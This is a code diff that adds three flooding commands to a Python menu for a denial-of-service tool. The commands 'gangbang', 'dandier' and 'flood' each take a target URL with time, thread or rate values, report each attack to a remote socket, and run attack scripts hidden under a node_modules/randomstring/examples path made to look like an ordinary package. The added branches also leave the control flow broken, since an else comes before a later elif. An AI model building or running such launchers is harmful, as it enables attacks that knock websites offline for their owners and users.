@@ -191,6 +191,47 @@ def main():
                 print('Usage: http-rand <url> <time>')
                 print('Example: http-rand http://vailon.com/ 60')
 
+        elif "gangbang" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                sendsocket(socket_url, f"\n\n---------------\nGANGBANG\n---------------\nTarget: {url}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
+                mix = os.path.join("node_modules/randomstring/examples/methods", "mix.js")
+                os.system(f'node {mix} {url} {time}')
+            except IndexError:
+                print('Usage: gangbang <url> <time>')
+                print('Example: gangbang https://example.com 60')
+        
+        elif "dandier" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                sendsocket(socket_url, f"\n\n---------------\nDANDIER\n---------------\nTarget: {url}\nThreads: {thread}\n---------------\n‎ \n‎ \n‎ ")
+                dandier = os.path.join("node_modules/randomstring/examples/methods", "dandier.java")
+                os.system(f'java {dandier} {url} {thread}')
+            except IndexError:
+                print('Usage: dandier <url> <thread>')
+                print('Example: dandier https://example.com 15000')
+                
+        elif "flood" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                rpc = cnc.split()[3]
+                time = cnc.split()[4]
+                sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
+                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
+                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
+            except IndexError:
+                print('Usage: flood <target> <workers> <rpc> <timer>')
+                print('Example: flood https://example.com 500 250 60')
+                
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Method: [ " + cmmnd + " ] Tidak Di Temukan!")
+            except IndexError:
+                pass
 
         elif "help" in cnc:
             print(f'''
